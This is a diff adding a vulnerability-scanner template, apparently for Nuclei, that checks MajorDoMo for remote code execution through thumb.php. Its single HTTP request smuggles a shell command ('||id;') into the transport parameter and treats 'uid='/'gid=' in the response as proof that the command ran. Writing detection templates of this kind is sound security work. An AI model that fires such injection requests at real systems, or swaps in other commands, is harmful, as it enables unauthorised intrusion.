@@ -1,0 +1,25 @@
+id: MajorDoMo-thumb-RCE
+
+info:
+  name: MajorDoMo-thumb-RCE
+  author: iSee857
+  severity: critical
+  description: |
+   MajorDoMo-thumb-RCE.
+
+http:
+  - raw:
+      - |
+        GET /modules/thumb/thumb.php?url=cnRzcDocm1EMe3&debug=1&transport=%7C%7C+id%3B HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "uid="
+          - "gid="
+        part: body
